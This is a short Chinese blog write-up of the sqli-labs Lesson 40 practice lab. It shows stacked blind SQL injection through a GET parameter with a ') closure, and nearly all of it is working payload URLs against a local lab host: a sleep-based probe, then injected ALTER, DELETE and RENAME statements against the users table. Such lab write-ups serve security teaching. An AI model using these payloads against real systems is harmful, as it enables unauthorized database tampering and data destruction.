---
title: sqli-labs lession-40 GET盲注-堆叠注入-字符型
date: 2018-10-19 10:22:41
tags: [sqli-labs]
categories: sql注入
---

# sqli-labs lession-40 GET盲注-堆叠注入-字符型

---

## 分析

这一课只是是盲注的堆叠注入，并且闭合方式为`')`。

`http://192.168.75.132/sql/Less-40/?id=1') and if(1,sleep(10),null)%23`

![001](/img/sql/Lesson-40/001.png)

## 增

在password字段后添加status字段

``http://192.168.75.132/sql/Less-40/?id=1');ALTER TABLE `security`.`users` 
ADD COLUMN `status` tinyint(1) NOT NULL AFTER `password`;%23``

![002](/img/sql/Lesson-40/002.png)

![003](/img/sql/Lesson-40/003.png)

## 删

删除以admin开头的用户。

`http://192.168.75.132/sql/Less-40/?id=1');DELETE from users  where username like 'admin%';%23`

![004](/img/sql/Lesson-40/004.png)

## 改

`http://192.168.75.132/sql/Less-40/?id=1');alter TABLE users rename to newusrs;%23`

![005](/img/sql/Lesson-40/005.png)

![006](/img/sql/Lesson-40/006.png)

